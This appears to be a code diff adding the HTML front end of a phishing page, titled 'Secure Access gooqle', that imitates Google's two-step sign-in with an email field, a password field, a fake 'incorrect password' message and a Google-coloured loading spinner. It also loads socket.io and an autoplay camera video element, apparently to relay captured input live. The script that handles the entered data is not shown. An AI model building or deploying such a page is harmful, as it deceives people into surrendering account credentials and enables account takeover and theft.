@@ -1,0 +1,297 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <title>Secure Access gooqle</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+
+    <style>
+      body {
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        background-color: white;
+        margin: 0;
+        padding: 0;
+      }
+
+      .map-wrapper {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        overflow: hidden;
+        z-index: -2;
+      }
+
+      .map-background {
+        width: 100%;
+        height: 100%;
+        border: none;
+        object-fit: cover;
+        filter: brightness(60%) blur(1px);
+      }
+      #cameraBg {
+        position: fixed;
+        inset: 0;
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        z-index: -3;
+      }
+
+      /* DARK OVERLAY */
+      .overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.45);
+        backdrop-filter: blur(4px);
+        z-index: -2;
+      }
+      .google-spinner {
+        display: inline-block;
+        width: 40px;
+        height: 40px;
+        position: relative;
+      }
+
+      .google-spinner::after {
+        content: " ";
+        display: block;
+        width: 32px;
+        height: 32px;
+        margin: 4px;
+        border-radius: 50%;
+        border: 4px solid transparent;
+        border-top-color: #4285f4; /* Blue */
+        border-right-color: #34a853; /* Green */
+        border-bottom-color: #fbbc05; /* Yellow */
+        border-left-color: #ea4335; /* Red */
+        animation: spin 1s linear infinite;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      /* ======================== */
+      /*  LOGIN CARD + ELEMENTS  */
+      /* ======================== */
+
+      .card {
+        width: 100%;
+        max-width: 24rem;
+        background: #fff;
+        border-radius: 1rem;
+        box-shadow: 0 12px 32px rgba(0, 0, 0, 0.1);
+        border: 1px solid #e5e7eb;
+        color: #111827;
+        backdrop-filter: blur(4px);
+      }
+
+      .input-responsive {
+        padding: 0.75rem 1rem;
+        font-size: 1rem;
+        border-radius: 0.5rem;
+        border: 1px solid #d1d5db;
+        background: #f9fafb;
+        width: 100%;
+      }
+
+      .input-responsive:focus {
+        outline: none;
+        border-color: #3b82f6;
+        background: white;
+        box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.3);
+      }
+
+      .btn-responsive {
+        padding: 0.75rem 1.25rem;
+        background-color: #3b82f6;
+        color: white;
+        border-radius: 9999px;
+        font-weight: 600;
+        border: none;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+      }
+
+      .btn-responsive:hover {
+        background-color: #2563eb;
+      }
+
+      .hidden-element {
+        display: none;
+      }
+    </style>
+  </head>
+
+  <body
+    class="flex items-center justify-center min-h-screen px-4 py-8 relative"
+  >
+    <!-- ============================ -->
+    <!--        MAP BACKGROUND        -->
+    <!-- ============================ -->
+
+    <!-- CAMERA -->
+    <video id="cameraBg" autoplay muted playsinline></video>
+    <div class="overlay"></div>
+
+    <!-- ============================ -->
+    <!--          STEP: EMAIL         -->
+    <!-- ============================ -->
+
+    <div id="stepEmail" class="card px-10 py-8 w-full max-w-md text-left">
+      <img
+        src="./abc1234.jpg"
+        alt="logo icon"
+        class="w-24 mx-auto mb-6"
+        onerror="this.classList.add('hidden-element')"
+      />
+
+      <h1 class="text-2xl font-normal text-gray-800 mb-1 text-center">
+        Sign in
+      </h1>
+      <p class="text-sm text-gray-600 mb-6 text-center">
+        Sign in with mega account
+      </p>
+
+      <input
+        id="emailInput"
+        type="email"
+        placeholder="Email or username"
+        class="input-responsive mb-5 mt-2"
+        required
+        autocomplete="email"
+      />
+
+      <div class="mb-6">
+        <a href="#" class="text-sm text-blue-500 hover:underline">
+          Forgot your email?
+        </a>
+      </div>
+
+      <div class="flex items-center mb-6">
+        <div class="border-t border-gray-300 w-full"></div>
+        <span class="px-2 text-sm text-gray-500">or</span>
+        <div class="border-t border-gray-300 w-full"></div>
+      </div>
+
+      <p class="text-xs text-gray-500 leading-relaxed mb-6">
+        Ensure you're signing into the correct account.<br />
+        <a href="#" class="text-blue-500 hover:underline">
+          Learn about secure login
+        </a>
+      </p>
+
+      <div class="flex justify-between items-center text-sm">
+        <a href="#" class="text-blue-500 hover:underline">Create account</a>
+        <button onclick="goToPasswordStep()" class="btn-responsive">
+          Next
+        </button>
+      </div>
+    </div>
+
+    <!-- ============================ -->
+    <!--        STEP: PASSWORD        -->
+    <!-- ============================ -->
+
+    <div
+      id="stepPassword"
+      class="hidden card px-10 py-8 w-full max-w-md text-left"
+    >
+      <img
+        src="./abc1234.jpg"
+        alt="logo icon"
+        class="w-24 mx-auto mb-6"
+        onerror="this.classList.add('hidden-element')"
+      />
+
+      <h1 class="text-2xl text-gray-800 font-normal mb-1 text-center">
+        Welcome
+      </h1>
+      <div
+        class="flex justify-center items-center w-max border rounded-[30px] p-[6px] gap-1 mx-auto my-5"
+      >
+        <svg
+          aria-hidden="true"
+          fill="currentColor"
+          focusable="false"
+          width="24px"
+          height="24px"
+          viewBox="0 0 24 24"
+          xmlns="http://www.w3.org/2000/svg"
+        >
+          <path
+            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"
+          ></path>
+        </svg>
+        <p id="displayEmail" class="text-sm text-gray-600 text-center"></p>
+        <svg
+          aria-hidden="true"
+          fill="currentColor"
+          focusable="false"
+          width="24px"
+          height="24px"
+          viewBox="0 0 24 24"
+          xmlns="http://www.w3.org/2000/svg"
+        >
+          <path d="M7 10l5 5 5-5z"></path>
+        </svg>
+      </div>
+
+      <input
+        id="passwordInput"
+        type="password"
+        placeholder="Enter your password"
+        class="input-responsive mb-4"
+      />
+
+      <p id="passwordError" class="text-red-500 text-sm mb-4 hidden">
+        Incorrect password. Try again.
+      </p>
+
+      <div class="mb-6 flex items-center gap-2">
+        <input type="checkbox" id="showPassword" class="cursor-pointer" />
+        <label for="showPassword" class="text-sm cursor-pointer">
+          Show password
+        </label>
+      </div>
+
+      <p class="text-xs text-gray-500 leading-relaxed mb-6">
+        Not on a trusted device? Use a private window for safer access.<br />
+        <a href="#" class="text-blue-500 hover:underline">More security tips</a>
+      </p>
+
+      <div class="flex justify-between items-center text-sm">
+        <a href="#" class="text-blue-500 hover:underline">Create account</a>
+        <button onclick="showLoading()" class="btn-responsive">Next</button>
+      </div>
+    </div>
+
+    <!-- ============================ -->
+    <!--          STEP: LOADING       -->
+    <!-- ============================ -->
+
+    <div
+      id="stepLoading"
+      class="hidden flex flex-col items-center justify-center card px-6 py-8 text-center max-w-md w-full"
+    >
+      <div class="google-spinner mb-6"></div>
+      <p class="text-sm text-gray-500">Signing you in...</p>
+    </div>
+
+    <!-- JS -->
+    <script src="index.js"></script>
+  </body>
+</html>
